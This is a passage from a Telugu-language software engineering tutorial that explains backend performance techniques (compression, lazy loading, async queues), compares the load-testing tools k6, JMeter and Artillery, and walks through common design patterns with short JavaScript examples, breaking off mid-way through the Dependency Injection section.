- **CPU Optimization:** ఈవెంట్ లూప్‌ని బ్లాక్ చేయకుండా ఉండటం, `PM2` తో మల్టీ-కోర్ వాడటం మరియు భారీ టాస్క్స్‌ని వర్కర్ థ్రెడ్స్‌కి పంపడం.
- **Connection Pooling:** డేటాబేస్ కనెక్షన్లను ప్రతిసారీ క్రియేట్ చేయకుండా, ఒక పూల్ లో ముందే రెడీగా ఉంచి వాడుకోవడం ద్వారా స్పీడ్ పెంచడం, క్రాష్‌లను ఆపడం.

---

పర్ఫార్మెన్స్ ఇంజనీరింగ్ (Performance Engineering) ప్రపంచంలో వెబ్‌సైట్ లేదా యాప్ ఓపెన్ చేసినప్పుడు యూజర్‌కి క్షణాల్లో రెస్పాన్స్ వెళ్ళడానికి మరియు క్లౌడ్ నెట్‌వర్క్ కాస్ట్ (Bandwidth Cost) తగ్గించడానికి వాడే మూడు అద్భుతమైన ఆప్టిమైజేషన్ అస్త్రాలు ఇవి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, ప్రాక్టికల్ ఎగ్జాంపుల్స్‌తో తెలుగులో నేర్చుకుందాం.

---

## 1. Compression (డేటా సైజ్‌ను తగ్గించడం)

- **The Core Concept:** మీ బ్యాకెండ్ సర్వర్ నుండి బ్రౌజర్‌కి ఒక పెద్ద JSON రెస్పాన్స్ లేదా ఒక భారీ HTML/CSS ఫైల్ వెళ్తుంది అనుకుందాం. ఆ ఫైల్ సైజ్ 1 MB ఉంటే, అది నెట్‌వర్క్‌లో ప్రయాణించడానికి టైమ్ పడుతుంది. **Compression** ద్వారా ఆ ఫైల్‌ని సర్వర్ లోపలే ఒక జిప్ ఫైల్ లాగా కంప్రెస్ చేసి (ఉదాహరణకు 1 MB నుండి **200 KB** కి తగ్గించి) బ్రౌజర్‌కి పంపుతాం. బ్రౌజర్ దాన్ని రిసీవ్ చేసుకుని ఆటోమేటిక్‌గా అన్‌జిప్ చేసుకుంటుంది.
- **Algorithms (టెక్నాలజీస్):**

1. **Gzip:** ఇది దశాబ్దాలుగా వెబ్ ప్రపంచంలో వాడుతున్న అత్యంత పాపులర్ మరియు స్టాండర్డ్ కంప్రెషన్ పద్ధతి.
2. **Brotli (Google క్రియేషన్):** ఇది Gzip కంటే ఆధునికమైనది. ఇది డేటాని Gzip కంటే 15-20% ఎక్కువగా కంప్రెస్ చేయగలదు, దీనివల్ల ఏపీఐలు మరింత ఫాస్ట్ అవుతాయి. మోడర్న్ బ్రౌజర్లు అన్నీ బ్రోట్లీని సపోర్ట్ చేస్తాయి.

- **Implementation:** Node.js (Express) లో కేవలం **`compression`** అనే మిడిల్‌వేర్ వాడితే చాలు, అది ఆటోమేటిక్‌గా వచ్చే రిక్వెస్ట్ హెడర్స్ (`Accept-Encoding: gzip, br`) ని బట్టి రెస్పాన్స్‌ని కంప్రెస్ చేసి పంపుతుంది. Nginx లేదా AWS CloudFront లాంటి CDN లేయర్ లో కూడా దీన్ని కాన్ఫిగర్ చేయవచ్చు.

---

## 2. Lazy Loading (అడిగినప్పుడే ఇవ్వడం)

- **The Core Concept:** యూజర్‌కి ప్రస్తుతం స్క్రీన్ పైన ఏది కనిపిస్తుందో, దానికి కావలసిన డేటా లేదా ఫైల్స్ మాత్రమే మొదట లోడ్ చేయడం. మిగతా డేటాని యూజర్ పేజీని కిందకి స్క్రోల్ చేసినప్పుడు లేదా ఆ బటన్ క్లిక్ చేసినప్పుడు మాత్రమే బ్యాక్‌గ్రౌండ్‌లో లోడ్ చేయడం.
- **The Analogy:** మీరు ఒక హోటల్‌కి వెళ్లి భోజనం ఆర్డర్ చేశారు. వాడు స్టార్టర్స్, మెయిన్ కోర్స్, డిజర్ట్ (స్వీట్) అన్నీ ఒకేసారి టేబుల్ నిండా తెచ్చి పెట్టేస్తే టేబుల్ సరిపోదు, చల్లారిపోతాయి. దానికి బదులు మీరు మొదట స్టార్టర్స్ తింటున్నప్పుడు, నిమ్మదిగా మెయిన్ కోర్స్ వండటం "Lazy Loading" లాంటిది.
- **Real-World Use Cases:**
- **Images/Videos:** ఒక ఈ-కామర్స్ సైట్ లో 100 ప్రొడక్ట్స్ ఉన్నాయి. యూజర్ సైట్ ఓపెన్ చేయగానే పైన ఉన్న 4 ప్రొడక్ట్స్ ఇమేజ్ లు మాత్రమే లోడ్ అవుతాయి. యూజర్ స్క్రోల్ చేస్తున్న కొద్దీ కింద ఉన్న ఇమేజ్ లు లోడ్ అవుతాయి (`loading="lazy"` ఇన్ HTML).
- **Frontend Bundles:** React/Next.js యాప్స్ లో కోడ్ మొత్తాన్ని ఒకే పెద్ద JS ఫైల్ లాగా పంపకుండా, యూజర్ `/dashboard` కి వెళ్ళినప్పుడే ఆ డ్యాష్‌బోర్డ్ కోడ్ లోడ్ అయ్యేలా ముక్కలుగా విరగ్గొట్టడం (**Code Splitting**).

---

## 3. Async Processing (తర్వాత చూసుకుందాం!)

- **The Core Concept:** ఒక యూజర్ ఏపీఐ రిక్వెస్ట్ పంపినప్పుడు... ఆ రిక్వెస్ట్ సక్సెస్ అవ్వడానికి వెంటనే జరగాల్సిన పనులను మాత్రమే (Synchronous గా) చేసి యూజర్‌కి రెస్పాన్స్ ఇచ్చేయడం. సమయం ఎక్కువ తీసుకునే పనులను బ్యాక్‌గ్రౌండ్‌లో ఒక క్యూ (Queue) కి పంపి, నిమ్మదిగా ప్రాసెస్ చేయడం.
- **Why it's a game-changer:** ఏపీఐ రెస్పాన్స్ టైమ్ (Latency) విపరీతంగా తగ్గిపోతుంది.

### 📌 రియల్-వరల్డ్ సినారియో (ఉదాహరణ):

మీరు ఒక యాప్ లో సైన్-అప్ అయ్యారు. సర్వర్ లోపల ఈ 3 పనులు జరగాలి:

1. డేటాబేస్ లో యూజర్ రికార్డ్ క్రియేట్ చేయడం (Takes 10ms)
2. వెల్కమ్ ఈమెయిల్ మరియు SMS పంపడం (Takes 2 Seconds - థర్డ్ పార్టీ API)
3. సైన్-అప్ బోనస్ కాయిన్స్ క్రెడిట్ చేయడం (Takes 50ms)

### ❌ పాత పద్ధతి (Sync - స్లో):

సర్వర్ ఈ మూడూ ఒకదాని తర్వాత ఒకటి చేసి, ఆ 2 సెకన్లు ముగిసాక యూజర్‌కి "Success" అని చూపిస్తుంది. యూజర్ స్క్రీన్ వైపు చూస్తూ వెయిట్ చేయాలి.

### ఆధునిక పద్ధతి (Async - సూపర్ ఫాస్ట్):

1. సర్వర్ డేటాబేస్ లో రికార్డ్ క్రియేట్ చేస్తుంది (10ms).
2. "ఈమెయిల్ పంపాలి, కాయిన్స్ ఇవ్వాలి" అనే టాస్క్ ని ఒక **Message Queue** (BullMQ / RabbitMQ / AWS SQS) లో పడేస్తుంది.
3. వెంటనే యూజర్‌కి `201 Created` రెస్పాన్స్ పంపేస్తుంది. యూజర్ లోపలికి వెళ్ళిపోతాడు.
4. బ్యాక్‌గ్రౌండ్‌లో ఉండే **Worker Servers** ఆ క్యూ నుండి మెసేజ్ తీసుకొని నిమ్మదిగా ఈమెయిల్స్ పంపుకుంటూ ఉంటాయి.

```text
 [ User ] ──► (POST /signup) ──► [ Express Server ] ──► (Creates DB Record: 10ms)
    ▲                                    │
    │ (Responds Instantly: "Success")    ▼ (Pushes Task to Queue)
    └──────────────────────────── [ Message Queue (📦) ] ──► [ Background Worker ] ──► (Sends Email: 2s)

```

---

### 📌 క్విక్ సమ్మరీ (మూడు ముక్కల్లో):

- **Compression:** డేటా యొక్క లావును తగ్గించి నెట్‌వర్క్‌లో ఫాస్ట్ గా పంపడం (Brotli/Gzip).
- **Lazy Loading:** అప్పుడే అవసరం లేని డేటాని తర్వాత లోడ్ చేయడం ద్వారా మొదటి స్క్రీన్ లోడింగ్ స్పీడ్ పెంచడం.
- **Async Processing:** టైమ్ తినేసే భారీ పనులను (Email/PDF) బ్యాక్‌గ్రౌండ్ వర్కర్లకి అప్పగించి, యూజర్‌కి క్షణాల్లో రెస్పాన్స్ ఇవ్వడం.

---

పర్ఫార్మెన్స్ ఇంజనీరింగ్ (Performance Engineering) చాప్టర్‌లో మనం ఆల్రెడీ లోడ్ టెస్టింగ్ (Load Testing) మరియు స్ట్రెస్ టెస్టింగ్ (Stress Testing) ల సిద్ధాంతాలను నేర్చుకున్నాం. కానీ రియల్-వరల్డ్ ప్రొడక్షన్ సిస్టమ్స్ పై వేలాది, లక్షలాది వర్చువల్ యూజర్ల (Virtual Users) ట్రాఫిక్‌ను ఆర్టిఫిషియల్ గా క్రియేట్ చేయడానికి మనం కొన్ని ప్రత్యేకమైన **Load Testing Tools** వాడాలి.

మార్కెట్లో అత్యంత ప్రజాదరణ పొందిన మూడు మేజర్ టూల్స్—**k6**, **Apache JMeter**, మరియు **Artillery** ల గురించి, వాటి మధ్య ఉన్న తేడాలను మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. k6 (ది మోడర్న్ డెవలపర్-ఫేవరెట్)

- **What it is:** ఇది Grafana ల్యాబ్స్ వాళ్ళు డెవలప్ చేసిన అత్యంత ఆధునికమైన, ఓపెన్ సోర్స్ లోడ్ టెస్టింగ్ టూల్. దీని కోర్ ఇంజన్‌ను **Go (Golang)** లాంగ్వేజ్‌లో రాశారు, కానీ మనం టెస్ట్ స్క్రిప్ట్‌లను మాత్రం **JavaScript** లో రాస్తాం.
- **Why it's a massive hit:** మోడర్న్ డెవలపర్లు గ్రాఫికల్ టూల్స్ కంటే కోడ్ రాయడానికే ఎక్కువ ఇష్టపడతారు (**Testing as Code**). k6 లో మనం ఒక సింపుల్ JS ఫైల్ రాసి, గిట్‌హబ్‌లో దాచుకోవచ్చు. దీని పెర్ఫార్మెన్స్ అద్భుతంగా ఉంటుంది మరియు ఇది చాలా తక్కువ మెమరీ (RAM) తీసుకుంటుంది.
- **Best Use Case:** **CI/CD పైప్‌లైన్స్** (GitHub Actions, Jenkins) లోపల ఆటోమేటెడ్ లోడ్ టెస్టింగ్ రన్ చేయడానికి మరియు మైక్రోసర్వీసెస్, GraphQL, లేదా WebSockets ని టెస్ట్ చేయడానికి ఇది బెస్ట్ ఆప్షన్.

### 📝 ఒక చిన్న k6 స్క్రిప్ట్ ఉదాహరణ:

```javascript
import http from "k6/http";
import { sleep } from "k6";

// 10 మంది యూజర్లు 30 సెకన్ల పాటు నిరంతరం రిక్వెస్ట్‌లు పంపేలా కాన్ఫిగర్ చేయడం
export const options = {
  vus: 10,
  duration: "30s",
};

export default function () {
  http.get("https://my-backend-api.com/v1/products");
  sleep(1); // ప్రతి రిక్వెస్ట్ కి మధ్య 1 సెకన్ గ్యాప్
}
```

---

## 2. Apache JMeter (ది అల్టిమేట్ లెజెండ్)

- **What it is:** ఇది దశాబ్దాలుగా ఇండస్ట్రీని ఏలుతున్న మోస్ట్ పవర్‌ఫుల్, 100% **Java-based** పాత క్లాసిక్ టూల్.
- **How it works:** ఇందులో కోడ్ రాయాల్సిన అవసరం లేదు. దీనికి ఒక భారీ **GUI (Graphical User Interface)** డెస్క్‌టాప్ యాప్ ఉంటుంది. క్లిక్‌లు చేసుకుంటూ, డ్రాప్-డౌన్స్ వాడుకుంటూ పూర్తి కాంప్లెక్స్ టెస్ట్ ప్లాన్స్‌ని డిజైన్ చేయవచ్చు.
- **Why it's still relevant:** జెంకిన్స్ లాగే దీనికి కూడా వేలాది ప్లగిన్లు ఉన్నాయి. కేవలం HTTP APIs మాత్రమే కాదు, నేరుగా **JDBC ద్వారా డేటాబేస్ లోడ్ టెస్టింగ్**, FTP సర్వర్స్, LDAP, మరియు Soap APIs లని కూడా ఇది ఇన్-డీప్ గా టెస్ట్ చేయగలదు.
- **The Catch:** ఇది జావా ఆధారంగా రన్ అవ్వడం వల్ల, భారీ స్థాయిలో (ఉదాహరణకు లక్ష మంది యూజర్ల) ట్రాఫిక్ జనరేట్ చేయాలంటే మీ టెస్టింగ్ ల్యాప్‌టాప్/సర్వర్ యొక్క ర్యామ్ (RAM) మరియు CPU ని విపరీతంగా తినేస్తుంది (**Heavy Resource Consumer**).

---

## 3. Artillery (ది క్లౌడ్-నేటివ్ ప్యాకర్)

- **What it is:** ఇది **Node.js** ఆధారంగా నడిచే మరొక మోడర్న్, ప్రొఫెషనల్ లోడ్ టెస్టింగ్ ఫ్రేమ్‌వర్క్.
- **How it works:** ఇందులో మనం జావాస్క్రిప్ట్ కోడ్ కూడా రాయక్కర్లేదు. కేవలం ఒక **YAML** ఫైల్ రాసి కాన్ఫిగరేషన్ సెట్ చేస్తాం.
- **The Special Power (Cloud Scale):** ఆర్టిలరీ యొక్క అద్భుతమైన ఫీచర్ ఏంటంటే—ఇది **AWS Lambda** లేదా **Fargate** తో నేరుగా ఇంటిగ్రేట్ అవుతుంది. అంటే, మీ కంప్యూటర్ నుండి లోడ్ పంపకుండా, ఒక్క కమాండ్‌తో AWS క్లౌడ్‌లో వేలాది ల్యాంబ్డా ఫంక్షన్లను ఓపెన్ చేసి, వాటి ద్వారా మీ ప్రొడక్షన్ సర్వర్‌పై ఒకేసారి మిలియన్ల కొద్దీ రిక్వెస్ట్‌ల దాడి (Massive Distributed Load) చేయించగలదు.
- **Best Use Case:** Serverless అప్లికేషన్స్, HTTP/REST APIs, మరియు ఈ-కామర్స్ సైట్లపై విపరీతమైన భారీ స్థాయి లోడ్ వేసి పరీక్షించడానికి ఇది పర్ఫెక్ట్.

---

## 📌 క్విక్ కంపారిజన్ (ఏది ఎప్పుడు వాడాలి?):

| ఫీచర్                 | k6                              | Apache JMeter                                   | Artillery                              |
| --------------------- | ------------------------------- | ----------------------------------------------- | -------------------------------------- |
| **భాష / టెక్నాలజీ**   | Go (Engine) + **JavaScript**    | **Java** (Complete GUI)                         | **Node.js** + **YAML**                 |
| **టెస్టింగ్ శైలి**    | Code-driven (డెవలపర్ ఫ్రెండ్లీ) | UI-driven (టెస్టింగ్ టీమ్ ఫ్రెండ్లీ)            | Configuration-driven                   |
| **రిసోర్స్ వినియోగం** | చాలా తక్కువ (Highly Efficient)  | చాలా ఎక్కువ (Heavy RAM Usage)                   | మీడియం టు లో                           |
| **CI/CD ఆటోమేషన్**    | ఎక్సలెంట్ (Easy to integrate)   | కొంచెం కాంప్లెక్స్ (Non-GUI mode లో రన్ చేయాలి) | ఎక్సలెంట్                              |
| **క్లౌడ్ స్కేలింగ్**  | k6 Cloud (Paid) లేదా సొంత సెటప్ | Distributed Testing (సొంతంగా సర్వర్లు పెట్టాలి) | **AWS Lambda తో ఇన్-బిల్ట్ స్కేలింగ్** |

---

### 📌 సమ్మరీ గైడ్ లైన్:

- మీరు డెవలపర్ అయి, కోడ్ ద్వారా సులువుగా చిన్న టు మీడియం లోడ్ టెస్ట్స్ రాసి CI/CD లో పెట్టాలి అనుకుంటే ──► **k6** వాడండి.
- మీది ఒక పెద్ద ఎంటర్‌ప్రైజ్ అప్లికేషన్ అయి, డేటాబేస్ లు, పాత ప్రోటోకాల్స్ తో కలిపి కాంప్లెక్స్ టెస్ట్ ప్లాన్స్ UI లో డిజైన్ చేయాలి అనుకుంటే ──► **JMeter** వాడండి.
- మీరు AWS క్లౌడ్‌లో సర్వర్‌లెస్ పవర్‌ని వాడుకుంటూ అతి తక్కువ టైమ్‌లో భారీ స్థాయి (Massive Load) ట్రాఫిక్ పంపి సిస్టమ్‌ను బ్రేక్ చేయాలి అనుకుంటే ──► **Artillery** వాడండి.

---

# 15: Design Patterns

సాఫ్ట్‌వేర్ ఇంజనీరింగ్ రోడ్‌మ్యాప్‌లో **Design Patterns** అనేది ఒక మాస్టర్ కీ లాంటిది. కోడ్ రాసేటప్పుడు వచ్చే సాధారణ సమస్యలకు (Common Problems), నిపుణులైన ప్రోగ్రామర్లు ఇప్పటికే కనిపెట్టిన "సరికొత్త పరిష్కారాలే" ఈ డిజైన్ ప్యాటర్న్స్. వీటిని వాడుకుంటే మీ కోడ్ మెయింటెనబుల్‌గా, స్కేలబుల్‌గా మరియు క్లీన్‌గా ఉంటుంది.

ఈరోజు మనం **Creational Design Patterns** లోని మూడు ముఖ్యమైన ప్యాటర్న్స్ గురించి నేర్చుకుందాం.

---

## 1. Singleton Pattern (ఒక్కటే ఉండాలి)

- **The Core Concept:** ఒక క్లాస్‌కి మొత్తం అప్లికేషన్ లైఫ్ టైమ్‌లో **కేవలం ఒకే ఒక్క ఇన్‌స్టాన్స్ (Instance/Object)** మాత్రమే ఉండాలి అని రూల్ పెట్టడం.
- **Why it's needed:** ఉదాహరణకు, మీ అప్లికేషన్‌లో డేటాబేస్ కనెక్షన్ పూల్ లేదా లాగింగ్ సర్వీస్ ఉన్నాయి అనుకోండి. వీటికి వంద ఆబ్జెక్టులు క్రియేట్ చేస్తే మెమరీ వేస్ట్ అవుతుంది మరియు కనెక్షన్లు కన్ఫ్యూజ్ అవుతాయి. ఆ సమయంలో "సింగిల్‌టన్" వాడతాం.
- **How it works:** ఆ క్లాస్ కన్స్ట్రక్టర్‌ను ప్రైవేట్ (Private) చేస్తాం. ఆబ్జెక్ట్ కావాలంటే ఒకే ఒక పద్ధతి (Static Method) ద్వారా అడుగుతాం. అది అప్పటికే ఆబ్జెక్ట్ క్రియేట్ అయి ఉంటే దాన్నే ఇస్తుంది, లేకపోతే కొత్తది క్రియేట్ చేసి ఇస్తుంది.

```javascript
class Database {
  constructor() {
    if (Database.instance) return Database.instance;
    this.connection = "Connected to DB";
    Database.instance = this;
  }
}
const db1 = new Database();
const db2 = new Database(); // ఇది కూడా db1 ఆబ్జెక్ట్ నే ఇస్తుంది!
```

---

## 2. Factory Pattern (కోరిక మేరకు ఆబ్జెక్ట్ తయారీ)

- **The Core Concept:** ఆబ్జెక్ట్‌లను నేరుగా `new` కీవర్డ్ తో క్రియేట్ చేయకుండా... ఒక ప్రత్యేకమైన **"ఫ్యాక్టరీ"** మెథడ్ ద్వారా క్రియేట్ చేయడం.
- **Why it's needed:** మీ యాప్ లో యూజర్ టైప్ ని బట్టి (Admin, Customer, Guest) వేర్వేరు క్లాసులను క్రియేట్ చేయాలి అనుకోండి. యూజర్‌కి ఏ క్లాస్ క్రియేట్ అవుతుందో తెలియకూడదు, కేవలం ఆబ్జెక్ట్ వస్తే చాలు.
- **How it works:** మీరు ఫ్యాక్టరీకి ఒక "టైప్" పంపుతారు, అది దానికి తగ్గ ఆబ్జెక్ట్‌ను రెడీ చేసి మీకు రిటర్న్ చేస్తుంది.

```javascript
class UserFactory {
  createUser(role) {
    if (role === "admin") return new Admin();
    if (role === "customer") return new Customer();
  }
}
const factory = new UserFactory();
const user = factory.createUser("admin"); // లాజిక్ మొత్తం ఫ్యాక్టరీ లోనే ఉంటుంది.
```

---

## 3. Builder Pattern (ముక్కలు ముక్కలుగా నిర్మాణం)

- **The Core Concept:** ఒక కాంప్లెక్స్ ఆబ్జెక్ట్ ని క్రియేట్ చేయడానికి చాలా ప్రాపర్టీస్ (Options) ఉంటే, కన్స్ట్రక్టర్ లో 10-15 పారామీటర్లు పాస్ చేయడం కష్టం. అప్పుడు ఈ **బిల్డర్ ప్యాటర్న్** వాడతాం.
- **Why it's needed:** ఉదాహరణకు, మీరు ఒక `Pizza` ఆబ్జెక్ట్ ని తయారు చేస్తున్నారు అనుకోండి (Size, Crust, Cheese, Toppings, Sauce, etc.). ప్రతీసారి అన్ని ఆప్షన్స్ అవసరం లేదు. బిల్డర్ ప్యాటర్న్ వల్ల మనం మనకు కావలసినవి మాత్రమే సెలెక్ట్ చేసుకుంటూ బిల్డ్ చేయవచ్చు.
- **How it works:** ఇందులో ఆబ్జెక్ట్‌ని ముక్కలు ముక్కలుగా (Step-by-step) క్రియేట్ చేసి చివరగా `.build()` అని కొడితే ఆబ్జెక్ట్ రెడీ అవుతుంది.

```javascript
class PizzaBuilder {
  constructor() {
    this.pizza = {};
  }
  setCrust(type) {
    this.pizza.crust = type;
    return this;
  }
  setToppings(t) {
    this.pizza.toppings = t;
    return this;
  }
  build() {
    return this.pizza;
  }
}

const myPizza = new PizzaBuilder()
  .setCrust("thin")
  .setToppings("cheese")
  .build();
```

---

### 📌 ఒక్క ముక్కలో సమ్మరీ:

| ప్యాటర్న్     | దేని కోసం?                            | రియల్ వరల్డ్ ఎగ్జాంపుల్                        |
| ------------- | ------------------------------------- | ---------------------------------------------- |
| **Singleton** | ఒకే ఒక్క ఆబ్జెక్ట్ ఉండాలి             | డేటాబేస్ కనెక్షన్స్, కాన్ఫిగరేషన్ సెట్టింగ్స్. |
| **Factory**   | టైప్ ని బట్టి ఆబ్జెక్ట్స్ తయారు చేయడం | నోటిఫికేషన్ సర్వీస్ (Email/SMS/Push).          |
| **Builder**   | కాంప్లెక్స్ ఆబ్జెక్ట్ బిల్డ్ చేయడం    | పిజ్జా ఆర్డర్, క్లిష్టమైన సర్వర్ కాన్ఫిగరేషన్. |

---

డిజైన్ ప్యాటర్న్స్ చాప్టర్ కొనసాగిస్తూ, ఇప్పుడు **Behavioral (ప్రవర్తన)** మరియు **Structural (నిర్మాణ)** విభాగాలకు చెందిన మూడు అత్యంత ఉపయోగకరమైన ప్యాటర్న్స్ గురించి నేర్చుకుందాం. ఇవి మీ కోడ్‌లో లాజిక్ ఎలా ఫ్లో అవ్వాలో మరియు వేర్వేరు కాంపోనెంట్స్ ఎలా మాట్లాడుకోవాలో డిజైన్ చేస్తాయి.

---

## 1. Strategy Pattern (అవసరాన్ని బట్టి మార్చుకోవడం)

- **The Core Concept:** ఒకే పనిని చేయడానికి మీరు ఒకటి కంటే ఎక్కువ మార్గాలు (Algorithms) కలిగి ఉన్నప్పుడు, రన్-టైమ్‌లో మనకు కావలసిన స్ట్రాటజీని (మార్గాన్ని) ఎంచుకోవడానికి ఇది ఉపయోగపడుతుంది.
- **Why it's needed:** ఉదాహరణకు, మీరు ఒక ఈ-కామర్స్ సైట్‌లో "Payment Gateway" బిల్డ్ చేస్తున్నారు. యూజర్ క్రెడిట్ కార్డ్, పేపాల్ (PayPal), లేదా క్రిప్టో... ఏది కావాలంటే అది వాడుకోవాలి. `if-else` తో వంద కండిషన్లు రాయకుండా, ప్రతి పేమెంట్ మెథడ్ కి ఒక "స్ట్రాటజీ" రాసి, ఆబ్జెక్ట్‌ని పంపిస్తాం.
- **How it works:** ప్రతి స్ట్రాటజీ ఒకే విధమైన మెథడ్ (ఉదా: `pay()`) కలిగి ఉంటుంది. మీరు ఏ స్ట్రాటజీని పాస్ చేస్తే అది ఆ మెథడ్ ని రన్ చేస్తుంది.

```javascript
class PayPalStrategy {
  pay(amount) {
    console.log(`Paid ${amount} via PayPal`);
  }
}
class CreditCardStrategy {
  pay(amount) {
    console.log(`Paid ${amount} via Card`);
  }
}

class ShoppingCart {
  setStrategy(strategy) {
    this.strategy = strategy;
  }
  checkout(amount) {
    this.strategy.pay(amount);
  }
}
// యూజర్ కోరుకున్నప్పుడు స్ట్రాటజీ మార్చవచ్చు
const cart = new ShoppingCart();
cart.setStrategy(new PayPalStrategy());
cart.checkout(100);
```

---

## 2. Observer Pattern (సబ్‌స్క్రయిబ్ అండ్ అప్‌డేట్)

- **The Core Concept:** ఇది "వన్-టు-మెనీ" (One-to-Many) రిలేషన్‌షిప్. ఒక ఆబ్జెక్ట్ (Subject) స్టేట్ మారినప్పుడు, దానికి కనెక్ట్ అయి ఉన్న మిగతా ఆబ్జెక్టులన్నింటికీ (Observers) ఆటోమేటిక్‌గా అప్‌డేట్ వెళ్తుంది.
- **Why it's needed:** రియల్ టైమ్ నోటిఫికేషన్లు, సోషల్ మీడియా ఫీడ్స్ లేదా మానిటరింగ్ సిస్టమ్స్‌లో ఇది వాడతారు.
- **How it works:** ఒక "సబ్‌స్క్రైబ్" లిస్ట్ ఉంటుంది. సబ్జెక్ట్ ఏ మార్పు జరిగినా ఆ లిస్ట్ లో ఉన్న అందరికీ ఒక మెసేజ్ పంపుతుంది.
- **Real-world Example:** YouTubeలో మీరు ఒక ఛానల్‌కి "సబ్‌స్క్రయిబ్" చేసుకుంటే, వారు వీడియో అప్‌లోడ్ చేసిన వెంటనే మీకు నోటిఫికేషన్ వస్తుంది. యూట్యూబ్ ఛానల్ అనేది `Subject`, మీరు `Observer`.

---

## 3. Adapter Pattern (కనెక్ట్ కానీ వాటిని కలపడం)

- **The Core Concept:** రెండు వేర్వేరు ఇంటర్‌ఫేస్ (Interfaces) ఉన్న క్లాసులను ఒకదానితో ఒకటి కలిపి పనిచేయించడం. ఇది నిజ జీవితంలో ఒక "పవర్ ప్లగ్ అడాప్టర్" లాంటిది.
- **Why it's needed:** ఉదాహరణకు, మీ పాత కోడ్ ఒక `OldLogger` క్లాస్ వాడుతోంది, దానికి `log(msg)` అనే మెథడ్ ఉంది. కొత్తగా మీరు ఒక `NewLogger` లైబ్రరీని కొన్నారు, దానికి `write(msg)` అని పేరుంది. మీరు పాత కోడ్ అంతా మార్చలేరు, కాబట్టి మధ్యలో ఒక "అడాప్టర్" పెట్టి పాత `log` పిలిస్తే అది కొత్త `write` ని కాల్ చేసేలా చేస్తారు.

```javascript
// కొత్త లైబ్రరీ ఇలా ఉంది
class NewLogger {
  write(msg) {
    console.log("New:", msg);
  }
}

// అడాప్టర్
class LoggerAdapter {
  constructor() {
    this.newLogger = new NewLogger();
  }
  log(msg) {
    this.newLogger.write(msg);
  } // పాత పేరుతో కొత్తదాన్ని పిలుస్తున్నాం
}
```

---

### 📌 క్విక్ సమ్మరీ:

| ప్యాటర్న్    | దేని కోసం?                        | రియల్ వరల్డ్ ఎగ్జాంపుల్                    |
| ------------ | --------------------------------- | ------------------------------------------ |
| **Strategy** | రన్-టైమ్‌లో పద్ధతిని మార్చడానికి  | పేమెంట్ గేట్‌వేలు, ఫైల్ కంప్రెషన్ మెథడ్స్. |
| **Observer** | ఈవెంట్ బేస్డ్ కమ్యూనికేషన్        | ఛానల్ నోటిఫికేషన్లు, ఈవెంట్ ఎమిటర్స్.      |
| **Adapter**  | పాత వాటిని కొత్త వాటితో కలపడానికి | API ఇంటిగ్రేషన్లు, లెగసీ కోడ్ సపోర్ట్.     |

---

ఈ ప్యాటర్న్స్ అన్నీ **Clean Architecture** మరియు **Enterprise-grade Software Development**లో వెన్నెముక వంటివి. ఇవి మీ కోడ్‌ని ఎలా సులభంగా టెస్ట్ చేయవచ్చు (Testable), ఎలా స్కేల్ చేయవచ్చు (Maintainable) అనేది చూపిస్తాయి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Decorator Pattern (కొత్త ఫీచర్‌ని యాడ్ చేయడం)

- **The Core Concept:** ఒక మెయిన్ ఆబ్జెక్ట్ (ఉదా: `Coffee`) యొక్క స్వభావాన్ని మార్చకుండా, దానికి అదనపు ఫీచర్లను (ఉదా: `Milk`, `Sugar`) కలుపుతూ వెళ్ళే ప్యాటర్న్. ఆరిజినల్ ఆబ్జెక్ట్‌ని మార్చకుండా కొత్త ప్రవర్తనను (Behavior) యాడ్ చేయడం దీని ప్రత్యేకత.
- **Why it's needed:** ఇన్హెరిటెన్స్ (Inheritance) వాడితే క్లాసులు విపరీతంగా పెరిగిపోయి గందరగోళంగా మారుతాయి. దానికి బదులు డెకరేటర్ ద్వారా రన్-టైమ్‌లో ఫీచర్లు యాడ్ చేయవచ్చు.
- **Real-world Example:** ఒక వెబ్ అప్లికేషన్‌లో ఏదైనా ఫంక్షన్ ఎగ్జిక్యూట్ అయ్యే ముందు లాగ్స్ ప్రింట్ చేయడం లేదా ఒక ఏపీఐ కి కన్నా ముందు **అథెంటికేషన్ (Authentication)** చెక్ చేయడం.

```javascript
// ఒరిజినల్ ఫంక్షన్
function getProduct() {
  return "Product Data";
}

// డెకరేటర్: లాగింగ్ యాడ్ చేయడం
function loggerDecorator(fn) {
  return function () {
    console.log("Fetching data...");
    return fn();
  };
}
const decoratedGetProduct = loggerDecorator(getProduct);
decoratedGetProduct(); // "Fetching data..." + "Product Data"
```

---

## 2. Repository Pattern (డేటాబేస్ ని కోడ్ నుండి వేరు చేయడం)

- **The Core Concept:** ఇది డేటా యాక్సెస్ లేయర్ (Data Access Layer). అప్లికేషన్ లాజిక్ మరియు డేటాబేస్ క్వెరీల మధ్య ఒక వంతెన (Bridge) లాగా పనిచేస్తుంది.
- **Why it's needed:** రేపు పొద్దున్న మీరు డేటాబేస్‌ను **Postgres** నుండి **MongoDB** కి మార్చాలనుకుంటే, మీ యాప్ లోని ప్రతి చోట క్వెరీలు మార్చకూడదు. ఈ ప్యాటర్న్ వాడితే, కేవలం రిపోజిటరీ ఫైల్ లోనే మార్పులు చేస్తే సరిపోతుంది.
- **Benefits:**
- **Decoupling:** బిజినెస్ లాజిక్ కు డేటా ఎలా వస్తుందో (SQL ఆర్ నో-SQL ఆర్ API) సంబంధం లేదు.
- **Testing:** డేటాబేస్ లేకుండానే, నకిలీ డేటాను (Mock Data) పంపించి టెస్ట్ చేసుకోవచ్చు.

```text
 [ Business Service ] ──► [ IUserRepository (Interface) ] ──► [ UserRepository (SQL Logic) ]

```

---

## 3. Dependency Injection (DI - పజిల్ లాగా అమర్చడం)

- **The Core Concept:** ఒక క్లాస్‌కి కావాల్సిన ఇతర ఆబ్జెక్టులను (Dependencies) అదే క్రియేట్ చేసుకోకుండా, బయట నుండే అందించడం (Inject చేయడం).
- **The Analogy:** ఒక కార్ డ్రైవర్ కావాలి అంటే, డ్రైవర్ తన సొంత కారును తనే తయారు చేసుకోకూడదు. కారును బయట నుండి డ్రైవర్‌కి ఇవ్వాలి. అప్పుడు డ్రైవర్ ఎవరినైనా డ్రైవ్ చేయగలడు, కారు ఏదైనా తను డ్రైవ్ చేయగలడు.
